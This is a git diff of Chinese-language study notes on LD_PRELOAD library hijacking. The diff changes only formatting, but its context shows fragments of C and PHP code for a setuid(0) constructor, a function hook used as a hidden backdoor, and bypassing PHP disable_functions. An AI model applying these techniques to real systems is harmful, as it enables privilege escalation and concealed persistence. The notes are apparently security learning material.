@@ -1,9 +1,10 @@
 ---
 title: "LD_PRELOAD劫持"
-pubDatetime: 2025-01-20T21:06:41.000+08:00
+modDatetime: 2025-01-20T21:06:41.000+08:00
 description: "LD_PRELOAD 动态链接库劫持触发条件与利用方式"
 tags: ["others"]
 ---
+
 [学习文章](https://luokuang1.github.io/2024/08/16/%E6%B5%85%E8%B0%88LD-PRELOAD%E5%8A%AB%E6%8C%81/)
 
 用命令`readelf -Ws /usr/bin/ls`看linux命令中执行了调用了哪些函数,然后再劫持这些函数
@@ -18,11 +19,12 @@ tags: ["others"]
 编译 `gcc -shared -fPIC -o test.so test.c`
 
 ## .so 文件加载触发
+
 ```c
 #include <stdlib.h>
 #include <stdio.h>
 #include <string.h>
- 
+
 __attribute__ ((__constructor__)) void preload (void){
     unsetenv("LD_PRELOAD");
     setuid(0);
@@ -32,11 +34,12 @@ __attribute__ ((__constructor__)) void preload (void){
 ```
 
 ## .so 文件加载触发
+
 ```c
 #include <stdlib.h>
 #include <stdio.h>
 #include <string.h>
- 
+
 __attribute__ ((__constructor__)) void preload (void){
     unsetenv("LD_PRELOAD");
     setuid(0);
@@ -46,6 +49,7 @@ __attribute__ ((__constructor__)) void preload (void){
 ```
 
 ## 防止无穷递归
+
 ```c
 int strncmp(const char *s1, const char *s2, size_t n){
     if(getenv("LD_PRELOAD") == NULL){
@@ -57,10 +61,10 @@ int strncmp(const char *s1, const char *s2, size_t n){
 }
 ```
 
-
 ## 奇怪的错误
 
 报segmentation fault
+
 ```c
 #include <stdio.h>
 #include <stdlib.h>
@@ -88,7 +92,6 @@ getenv也会调用puts,所以用上面的方法也不行
 
 可以用static int flag作为标记,防止递归调用, 见下例
 
-
 ## 隐匿后门
 
 ```c
@@ -114,9 +117,11 @@ int puts(const char *s) {
 可以使得原来的命令正常执行,用于后门隐匿
 
 ## 突破disable_function
+
 disable_function只在当前进程生效
 mail 或 error_log, ImageMagick函数产生一个新进程, 并执行了getuid函数
 劫持getuid函数 或 采用加载触发即可
+
 ```php
 <?php
 
@@ -128,5 +133,6 @@ mail('','','','');
 ```
 
 ### 使用GCONV_PATH与iconv进行bypass disable_functions
+
 这个同样可以bypass
 https://xz.aliyun.com/news/8262
